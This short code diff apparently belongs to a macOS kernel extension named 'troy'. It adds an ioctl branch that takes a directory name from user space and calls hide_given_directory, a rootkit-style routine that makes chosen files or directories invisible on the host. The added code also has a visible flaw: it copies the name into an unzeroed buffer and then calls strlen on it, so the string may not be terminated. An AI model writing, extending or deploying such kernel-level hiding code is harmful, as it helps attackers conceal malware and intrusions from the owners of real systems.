@@ -121,6 +121,30 @@ int  troy_ioctl_fn(dev_t dev, u_long cmd, caddr_t data, int fflag, struct proc *
             }
 
             bzero(dirent_hide, sizeof(troy_hide_object));
+
+            //1.get dirent name
+            uint64_t len = (user_addr_dirent_obj->name_len)+1;
+            dirent_hide->name = (char*)_MALLOC(sizeof(char)*len, M_TEMP, M_WAITOK);
+            if(dirent_hide->name==NULL) return TROY_ERROR_NOMEM;
+            copyin(CAST_USER_ADDR_T(user_addr_dirent_obj->name), dirent_hide->name, sizeof(char)*(len-1));
+
+            //2. type
+            dirent_hide->objec_type=user_addr_dirent_obj->objec_type;
+
+            //3. get len
+            dirent_hide->name_len = strlen(dirent_hide->name);
+
+            int return_code = hide_given_directory(dirent_hide);
+            if(return_code!=TROY_SUCCESS)
+            {
+                LOG(LOG_ERROR, "hide dirent failed.");
+            }
+            else
+            {
+                LOG(LOG_ERROR, "hide dirent successfully");
+            }
+            SAFE_FREE(dirent_hide->name);
+            SAFE_FREE(dirent_hide);
         }break;
 
         default:
